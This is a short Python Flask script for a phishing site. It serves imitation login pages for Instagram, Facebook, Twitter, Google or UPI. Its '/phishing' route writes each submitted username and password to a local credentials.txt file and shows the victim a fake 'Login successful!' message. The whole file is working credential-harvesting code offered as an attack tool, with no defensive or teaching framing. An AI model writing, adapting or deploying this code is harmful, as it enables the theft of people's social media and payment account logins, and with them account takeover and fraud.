from flask import Flask, request, render_template
import sys

app = Flask(__name__)

def get_template(service):
    templates = {
        'instagram': 'instagram.html',
        'facebook': 'facebook.html',
        'twitter': 'twitter.html',
        'google': 'google.html',
        'upi': 'upi.html'
    }
    return templates.get(service, 'instagram.html')

@app.route('/')
def login():
    service = sys.argv[1] if len(sys.argv) > 1 else 'instagram'
    return render_template(get_template(service))

@app.route('/phishing', methods=['POST'])
def phishing():
    username = request.form['username']
    password = request.form['password']

    # Log the captured credentials
    with open('credentials.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')

    return 'Login successful!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)